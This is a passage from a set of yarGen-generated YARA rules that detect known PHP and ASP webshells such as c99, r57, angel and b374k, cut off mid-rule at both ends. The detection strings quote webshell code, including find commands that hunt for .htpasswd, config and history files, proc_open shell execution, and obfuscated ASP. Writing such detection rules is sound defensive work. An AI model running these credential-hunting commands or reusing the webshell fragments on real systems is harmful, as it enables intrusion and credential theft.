      $s5 = "\" value=\\\"\".htmlspecialchars($sql_login).\"\\\"><input type=\\\"hidden\\\" name=\\\"sql_passwd\\\" value=\\\"\".htmlspecialc" ascii
      $s6 = "    ?><form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_" ascii
      $s7 = "\"\".htmlspecialchars($sql_server).\"\\\"><input type=\\\"hidden\\\" name=\\\"sql_port\\\" value=\\\"\".htmlspecialchars($sql_po" ascii
      $s8 = "pe=\\\"hidden\\\" name=\\\"sql_passwd\\\" value=\\\"\".htmlspecialchars($sql_passwd).\"\\\"><input type=\\\"hidden\\\" name=\\\"" ascii
      $s9 = "t\\\" value=\\\"\".htmlspecialchars($sql_port).\"\\\"><input type=\\\"hidden\\\" name=\\\"sql_tbl\\\" value=\\\"\".htmlspecialch" ascii
      $s10 = "pecialchars($sql_server); ?>\"><input type=\"hidden\" name=\"sql_port\" value=\"<?php echo htmlspecialchars($sql_port); ?>\"><in" ascii
      $s11 = "\"sql_passwd\" value=\"<?php echo htmlspecialchars($sql_passwd); ?>\"><input type=\"hidden\" name=\"sql_server\" value=\"<?php e" ascii
      $s12 = "ype=\\\"hidden\\\" name=\\\"sql_tbl\\\" value=\\\"\".htmlspecialchars($sql_tbl).\"\\\"><input type=\\\"hidden\\\" name=\\\"sql_o" ascii
      $s13 = "\"\\\"><input type=\\\"hidden\\\" name=\\\"sql_server\\\" value=\\\"\".htmlspecialchars($sql_server).\"\\\"><input type=\\\"hidd" ascii
      $s14 = "lspecialchars($sql_order).\"\\\"><b>From:</b>&nbsp;<input type=\\\"text\\\" name=\\\"sql_tbl_ls\\\" value=\\\"\".$sql_tbl_ls.\"" ascii
      $s15 = "borderColorLight=#c0c0c0 border=1><tr><td><input type=\\\"checkbox\\\" name=\\\"boxtbl_all\\\" value=\\\"1\\\"></td><td><center>" ascii
      $s16 = "      echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" n" ascii
      $s17 = "/b>&nbsp;<input type=\\\"text\\\" name=\\\"sql_tbl_le\\\" value=\\\"\".$sql_tbl_le.\"\\\">&nbsp;<input type=\\\"submit\\\" value" ascii
      $s18 = "pe=\\\"hidden\\\" name=\\\"submit\\\" value=\\\"1\\\"><input type=\\\"hidden\\\" name=\\\"sql_goto\\\" value=\\\"\".htmlspecialc" ascii
      $s19 = "en\\\" name=\\\"sql_act\\\" value=\\\"query\\\"><input type=\\\"hidden\\\" name=\\\"sql_tbl\\\" value=\\\"\".htmlspecialchars($s" ascii
      $s20 = "</center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c99v2_c99shell_Shell__ci___Biz_was_here_c99_locus7s_c99_218 {
   meta:
      description = "webshell - from files c99_PSych0.php, c99v2.php, c99shell.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = " array(\"<img src=\\\"\".$surl.\"act=img&img=forward\\\" alt=\\\"Forward\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\"" ascii
      $s2 = "\\\" alt=\\\"Drop\\\" height=\\\"13\\\" width=\\\"11\\\" border=\\\"0\\\"></a>&nbsp;<a href=\\\"\".$sql_surl.\"sql_tbl_act=inser" ascii
      $s3 = " array(\"<img src=\\\"\".$surl.\"act=img&img=back\\\" alt=\\\"Back\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\">\",\"" ascii
      $s4 = "l_surl.\"sql_act=query&sql_query=\".urlencode(\"DROP TABLE `\".$row[\"Name\"].\"`\").\"\\\"><img src=\\\"\".$surl.\"act=img&img=" ascii
      $s5 = "=\\\"\".$surl.\"act=img&img=sql_button_empty\\\" alt=\\\"Empty\\\" height=\\\"13\\\" width=\\\"11\\\" border=\\\"0\\\"></a>&nbsp" ascii
      $s6 = "bl_le.\"&sql_query=\".urlencode(\"DELETE FROM `\".$sql_tbl.\"` WHERE\".$w.\" LIMIT 1;\").\"\\\"><img src=\\\"\".$surl.\"act=img&" ascii
      $s7 = "sql_tbl_le.\"&sql_tbl_insert_q=\".urlencode($w).\"\\\"><img src=\\\"\".$surl.\"act=img&img=change\\\" alt=\\\"Edit\\\" height=" ascii
      $s8 = "  echo \"<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\\\"\".$surl.\"act=img&img=ext_\".$ext.\"\\\" border=\\\"0\\\">&nbsp;" ascii
      $s9 = " array(\"<img src=\\\"\".$surl.\"act=img&img=up\\\" alt=\\\"UPDIR\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\">\",$su" ascii
      $s10 = " array(\"<img src=\\\"\".$surl.\"act=img&img=buffer\\\" alt=\\\"Buffer\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\">" ascii
      $s11 = " array(\"<img src=\\\"\".$surl.\"act=img&img=search\\\" alt=\\\"Search\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\">" ascii
      $s12 = "\"].\"\\\"><img src=\\\"\".$surl.\"act=img&img=sql_button_insert\\\" alt=\\\"Insert\\\" height=\\\"13\\\" width=\\\"11\\\" borde" ascii
      $s13 = "\" height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\"></a>&nbsp;<a href=\\\"\".$surl.\"act=f&f=\".$uo.\"&ft=edit&d=\".$ud.\"" ascii
      $s14 = "ct=img&img=change\\\" alt=\\\"Change\\\" height=\\\"16\\\" width=\\\"19\\\" border=\\\"0\\\"></a>&nbsp;<a href=\\\"\".$surl.\"ac" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897_2014_4_0__1___2013____1__r00tsFSO_219 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, 2014.asp, 4.0 (1).asp, .asp, 2013.asp, .asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash6 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash7 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash8 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash9 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "'>Del</a> <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\",\"\"MoveFolder\"\")' onclick='return yesok()' cl" ascii
      $s2 = "'>Copy</a> <a href='javascript:FullForm(\"\"\"&Replace(Path&\"\\\"&F.Name,\"\\\",\"\\\\\")&\"\"\",\"\"DelFolder\"\")' onclick='r" ascii
      $s3 = "  ColorOn=1" fullword ascii
      $s4 = "'>Del</a> <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\",\"\"MoveFolder\"\")' onclick='return yesok()' cl" ascii
      $s5 = "'>Copy</a> <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"MoveFile\"\")' class='am' title='" fullword ascii
      $s6 = "'>Copy</a> <a href='javascript:FullForm(\"\"\"&Replace(Path&\"\\\"&F.Name,\"\\\",\"\\\\\")&\"\"\",\"\"DelFolder\"\")' onclick='r" ascii
      $s7 = "SI=\"<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>\" " fullword ascii
      $s8 = "If i mod 6=0 then SI=SI&\"</tr><tr>\"" fullword ascii
      $s9 = "  Response.flush" fullword ascii
      $s10 = "='am' title='" fullword ascii
      $s11 = "   objReg.Pattern=CreatePattern(keyword)" fullword ascii
      $s12 = "si=si&\"" fullword ascii
      $s13 = "     ColorOn=0" fullword ascii
      $s14 = "Si=Si&\"<a onclick=\"\"window.open('?Action=EditPower&PowerPath=\"&RepAth(PaTh&\"\\\"&L.nAme)&\"','EditPower','toolbar=0,locatio" ascii
      $s15 = "Si=Si&\"<a onclick=\"\"window.open('?Action=EditPower&PowerPath=\"&RepAth(PaTh&\"\\\"&L.nAme)&\"','EditPower','toolbar=0,locatio" ascii
      $s16 = "ctories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=300,height=200')\"\" href='###' class='am' title='" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_r57_Mohajer22_r57_kartal_cihshell_fix_r57_r57_iFX_220 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, r57_Mohajer22.php, r57_kartal.php, cihshell_fix.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash5 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash6 = "ad2eea05e8fe56b1fa769f8df49e42c78be5534237429aea9ea78b9b31e4c7ab"
      hash7 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash8 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "'find config* files in current dir'=>'find . -type f -name \"config*\"'," fullword ascii
      $s2 = "'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php'," fullword ascii
      $s3 = "'find all service.pwd files'=>'find / -type f -name service.pwd'," fullword ascii
      $s4 = "'find service.pwd files in current dir'=>'find . -type f -name service.pwd'," fullword ascii
      $s5 = "'find config.inc.php files'=>'find / -type f -name config.inc.php'," fullword ascii
      $s6 = "'find all .htpasswd files'=>'find / -type f -name .htpasswd'," fullword ascii
      $s7 = "'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd'," fullword ascii
      $s8 = "'list file attributes on a Linux second extended file system'=>'lsattr -va'," fullword ascii
      $s9 = "'find sgid files in current dir'=>'find . -type f -perm -02000 -ls'," fullword ascii
      $s10 = "'find all writable files'=>'find / -type f -perm -2 -ls'," fullword ascii
      $s11 = "'find all writable files in current dir'=>'find . -type f -perm -2 -ls'," fullword ascii
      $s12 = "'find .bash_history files in current dir'=>'find . -type f -name .bash_history'," fullword ascii
      $s13 = "'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc'," fullword ascii
      $s14 = "'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc'," fullword ascii
      $s15 = "'find all .mysql_history files'=>'find / -type f -name .mysql_history'," fullword ascii
      $s16 = "'find all writable directories in current dir'=>'find . -type d -perm -2 -ls'," fullword ascii
      $s17 = "'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history'," fullword ascii
      $s18 = "'find suid files in current dir'=>'find . -type f -perm -04000 -ls'," fullword ascii
      $s19 = "'find all writable directories and files in current dir'=>'find . -perm -2 -ls'," fullword ascii
      $s20 = "'find all writable directories'=>'find /  -type d -perm -2 -ls'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _angel_2011_221 {
   meta:
      description = "webshell - from files angel.php, 2011.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = " 2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights R" ascii
      $s3 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s4 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s5 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s6 = "$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s7 = "$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s8 = "<a href=\"javascript:g('portscan');\">Port Scan</a> | " fullword ascii
      $s9 = "<a href=\"javascript:g('eval');\">Eval PHP Code</a>" fullword ascii
      $s10 = "<a href=\"javascript:g('phpenv');\">PHP Variable</a> | " fullword ascii
      $s11 = "<a href=\"javascript:g('file');\">File Manager</a> | " fullword ascii
      $s12 = "<a href=\"javascript:g('mysqladmin');\">MYSQL Manager</a> | " fullword ascii
      $s13 = "<a href=\"javascript:g('secinfo');\">Security information</a> | " fullword ascii
      $s14 = "<td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>" fullword ascii
      $s15 = "$pass = md5($pass.'angel');" fullword ascii
      $s16 = "$pass = md5('angel'.$pass);" fullword ascii
      $s17 = "$pass = md5('angel'.$pass.'angel');" fullword ascii
      $s18 = "fwrite($fp,\"\\n\\n\");" fullword ascii
      $s19 = "$create = mysql_fetch_row($res);" fullword ascii
      $s20 = "if(!$res = @mysql_query($sql,$mysqllink)) { " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99v2_Shell__ci___Biz_was_here_c99_locus7s_c99_222 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99v2.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "ame=\"sql_db\" value=\"<?php echo htmlspecialchars($sql_db); ?>\"><input type=\"hidden\" name=\"sql_login\" value=\"<?php echo h" ascii
      $s2 = "lchars($sql_login); ?>\"><input type=\"hidden\" name=\"sql_passwd\" value=\"<?php echo htmlspecialchars($sql_passwd); ?>\"><inpu" ascii
      $s3 = "db\"><input type=\"hidden\" name=\"sql_login\" value=\"<?php echo htmlspecialchars($sql_login); ?>\"><input type=\"hidden\" name" ascii
      $s4 = "\"><input type=\"hidden\" name=\"sql_login\" value=\"<?php echo htmlspecialchars($sql_login); ?>\"><input type=\"hidden\" name=" ascii
      $s5 = "ql_db); ?>\"><input type=\"hidden\" name=\"sql_login\" value=\"<?php echo htmlspecialchars($sql_login); ?>\"><input type=\"hidde" ascii
      $s6 = "=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"<?php echo htmlsp" ascii
      $s7 = "></form></td><td width=\"30%\" height=\"1\"><b>Dump DB:</b><form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"a" ascii
      $s8 = "l_passwd=\".htmlspecialchars($sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_po" ascii
      $s9 = " ?><h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style=\"BORDER-COLLAPSE: collapse\" hei" ascii
      $s10 = "   ?><td width=\"25%\" height=\"100%\" valign=\"top\"><a href=\"<?php echo $surl.\"act=sql&sql_login=\".htmlspecialchars($sql_lo" ascii
      $s11 = "orm action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" va" ascii
      $s12 = "ame=\"sql_getfile\" size=\"30\" value=\"<?php echo htmlspecialchars($sql_getfile); ?>\">&nbsp;<input type=\"submit\" value=\"Get" ascii
      $s13 = "s($sql_server); ?>\"><input type=\"hidden\" name=\"sql_port\" value=\"<?php echo htmlspecialchars($sql_port); ?>\"><input type=" ascii
      $s14 = "d\" value=\"<?php echo htmlspecialchars($sql_passwd); ?>\"><input type=\"hidden\" name=\"sql_server\" value=\"<?php echo htmlspe" ascii
      $s15 = "\"hidden\" name=\"sql_server\" value=\"<?php echo htmlspecialchars($sql_server); ?>\"><input type=\"hidden\" name=\"sql_port\" v" ascii
      $s16 = "p echo htmlspecialchars($sql_port); ?>\"><input type=\"text\" name=\"sql_newtbl\" size=\"20\">&nbsp;<input type=\"submit\" value" ascii
      $s17 = "ars($sql_server); ?>\"><input type=\"hidden\" name=\"sql_port\" value=\"<?php echo htmlspecialchars($sql_port); ?>\"><input type" ascii
      $s18 = "swd\" value=\"<?php echo htmlspecialchars($sql_passwd); ?>\"><input type=\"hidden\" name=\"sql_server\" value=\"<?php echo htmls" ascii
      $s19 = " name=\"sql_newdb\" size=\"20\">&nbsp;<input type=\"submit\" value=\"Create\"></form></td><td width=\"30%\" height=\"1\"><b>View" ascii
      $s20 = "b><form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule ___1_____1___2014_10_23_14_54_16_223 {
   meta:
      description = "webshell - from files  (1).asp, .asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash2 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash3 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "RRS\".cmd{background-color:\"&color6&\";color:\"&color7&\"}\"" fullword ascii
      $s2 = "RRS\".C{background-color:\"&color5&\";border:0px}\"" fullword ascii
      $s3 = "RRS\"input,select,textarea{font-size: 12px;background-color:\"&color3&\";border:1px solid \"&color4&\"}\"" fullword ascii
      $s4 = "RRS\"body,td{font-size: 12px;background-color:\"&color1&\";color:\"&color2&\";}\"" fullword ascii
      $s5 = "color3" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "bottomad=\"" fullword ascii
      $s7 = "color6" fullword ascii
      $s8 = "color5" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _4_0__2014_4_0__1___2012_224 {
   meta:
      description = "webshell - from files 4.0.asp, _2014.asp, 4.0 (1).asp, _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash3 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash4 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $s1 = "clientPassword" fullword ascii
      $s2 = "strBAD=strBAD&\"If Request(\"\"\"&clientPassword&\"\"\")<>\"\"\"\" Then Session(\"\"#\"\")=Request(\"\"\"&clientPassword&\"\"\")" ascii
      $s3 = ">tpircs/<;'1emanelif&psa./segami/=emanF?" fullword ascii
      $s4 = ",htapf elifypoc.osf" fullword ascii
      $s5 = "respnose.Write strBAD&Action" fullword ascii
      $s6 = "(selbairavrevres.tseuqer=lru" fullword ascii
      $s7 = "(selbaIRavreVRES.TSeuQeR=UrevreS" fullword ascii
      $s8 = "(htaPpaM.revreS=htaPtooR" fullword ascii
      $s9 = "(htappam.revres=1htapelif" fullword ascii
      $s10 = "j \"\"&copyurl&\"\"" fullword ascii
      $s11 = "ssaPresU=prevres" fullword ascii
      $s12 = ",xep(tilps=xepdnr" fullword ascii
      $s13 = "))71,0(rebmundnr()" fullword ascii
      $s14 = "1emanelif&" fullword ascii
      $s15 = "(noisses" fullword ascii
      $s16 = "UrevreS=uu" fullword ascii
      $s17 = "gnihton=osf tes" fullword ascii
      $s18 = ",lru(verrtsni,lru(tfel=lru" fullword ascii
      $s19 = ",htapf(verrtsni-)htapf(nel,htapf(thgir=1emanelif" fullword ascii
      $s20 = "(noisses fi:esle:neht  0><)" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_4_0__1__225 {
   meta:
      description = "webshell - from files 4.0.asp, 4.0 (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
   strings:
      $x1 = "j cdx&\"<a href='http://mytool.chinaz.com/baidusort.aspx?host=\"&str1&\"&sortType=0' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s2 = "j cdx&\"<a href='http://www.odayexp.com/h4cker/tuoku/' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s3 = "j cdx&\"<a href='http://odayexp.com/h4cker/sql/' target='FileFrame'>\"&cxd&\" SQL---" fullword ascii
      $s4 = "j cdx&\"<a href='?Action=Logout' target='_top'>\"&cxd&\" <font color=green>" fullword ascii
      $s5 = "j SI&\"</tr></table>\":execute(shisanfun(\"fi dne:fi dne:fi dne:1+)" fullword ascii
      $s6 = "si=\"<center><a></a><div style='width:400px;padding:32px; align=left'><br><form action='\"&url&\"' method='post'><input name='pa" ascii
      $s7 = "execute(shisanfun(\"prevres=pp" fullword ascii
      $s8 = "noitcnuF dne" fullword ascii /* reversed goodware string 'end Function' */
      $s9 = "execute(shisanfun(\"))fLrCbv," fullword ascii
      $s10 = "+' target='blank'>\"&cxd&\" <font color=red>" fullword ascii
      $s11 = "execute(shisanfun(\"noitcnuF dnE" fullword ascii
      $s12 = " type='password' size='22'> <input type='submit' value='" fullword ascii
      $s13 = "&urevres&" fullword ascii
      $s14 = "&nufE j:1+)" fullword ascii
      $s15 = "!</font ></b> <br><br><br><br><b><div align=center><font size='14' color='lime'></font></b></p></center>\"&backurl" fullword ascii
      $s16 = "copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39)&chr(104)&" ascii
      $s17 = "<scrip3" fullword ascii
      $s18 = "4.0\"'  " fullword ascii
      $s19 = " src='h3" fullword ascii
      $s20 = "38)&chr(112)&chr(61)&pp&chr(39)&chr(62)&chr(60)&chr(47)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(62)&chr(13)&chr" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _4_0__2014_4_0__1__UnKnown_Vip__1__UnKnown_Vip__2012_226 {
   meta:
      description = "webshell - from files 4.0.asp, _2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash3 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash4 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash5 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash6 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $s1 = "tsoh_ptth" fullword ascii /* reversed goodware string 'http_host' */
      $s2 = "detalsnart_htap" fullword ascii /* reversed goodware string 'path_translated' */
      $s3 = "eman_revres" fullword ascii /* reversed goodware string 'server_name' */
      $s4 = "DETALSNART_HTAP" fullword ascii /* reversed goodware string 'PATH_TRANSLATED' */
      $s5 = "//:ptth'=noitacol.tnerap>tpircs<" fullword ascii
      $s6 = "cevres" fullword ascii
      $s7 = "&xepdnr&" fullword ascii
      $s8 = "&1htapelif&" fullword ascii
      $s9 = "&lruypoc&" fullword ascii
      $s10 = "(noisses:neht 1=)" fullword ascii
      $s11 = "(selbairaVrevreS.tseuqeR=PIrevreS" fullword ascii
      $s12 = ",urevreS(rtsnI ro 0><)" fullword ascii
      $s13 = "(tseuqeR=emaNF" fullword ascii
      $s14 = "(htaPpaM.revreS=tooRWWW" fullword ascii
      $s15 = "(noisses=)" fullword ascii
      $s16 = "&xepdnr&))" fullword ascii
      $s17 = "(tseuqeR=htaPredloF" fullword ascii
      $s18 = "(selbairaVrevreS.tseuqeR=LRU\"))" fullword ascii
      $s19 = "&lru&)" fullword ascii
      $s20 = "9tpl|8tpl|7tpl|6tpl|5tpl|4tpl|3tpl|2tpl|1tpl|9moc|8moc|7moc|6moc|5moc|4moc|3moc|2moc|1moc" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _1n73ction_b374k_2_2_227 {
   meta:
      description = "webshell - from files 1n73ction.php, b374k-2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash2 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
   strings:
      $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s2 = "$descriptorspec = array(0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));" fullword ascii
      $s3 = "if(!is_resource($process)) exit(1);" fullword ascii
      $s4 = "if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);" fullword ascii
      $s5 = "elseif(function_exists('shell_exec')){" fullword ascii
      $s6 = "if(function_exists(\"posix_getpwuid\") && function_exists(\"posix_getgrgid\")) $posix = TRUE;" fullword ascii
      $s7 = "elseif(function_exists('exec')) {" fullword ascii
      $s8 = "stream_set_blocking($pipes[1], 0);" fullword ascii
      $s9 = "stream_set_blocking($pipes[0], 0);" fullword ascii
      $s10 = "$owner = $user;" fullword ascii
      $s11 = "if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);" fullword ascii
      $s12 = "$user = \"????:????\";" fullword ascii
      $s13 = "elseif(function_exists('passthru')) {" fullword ascii
      $s14 = "stream_set_blocking($pipes[2], 0);" fullword ascii /* Goodware String - occured 1 times */
      $s15 = "// check safemode" fullword ascii
      $s16 = "else $posix = FALSE;" fullword ascii
      $s17 = "$pwd = realpath(\".\").\"\\\\\";" fullword ascii
      $s18 = "<tr><td>Owner</td><td>\".$owner.\"</td></tr>" fullword ascii
